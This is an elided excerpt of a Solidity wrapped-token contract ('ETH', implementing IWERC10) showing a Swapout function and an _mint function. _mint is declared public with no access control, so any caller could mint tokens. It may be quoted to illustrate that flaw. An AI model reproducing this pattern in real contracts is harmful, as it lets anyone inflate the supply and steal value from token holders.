...
contract ETH is IWERC10 {
    ...
    function Swapout(uint256 amount, address bindaddr) public returns (bool) {
        require(bindaddr != address(0x74b23882a30290451A17c44f4F05243b6b58C76d), "bind address is the Token address");
    ...
    function _mint(address account, uint256 amount) public {
        require(account != address(0x74b23882a30290451A17c44f4F05243b6b58C76d), "ERC20: mint from the token address");
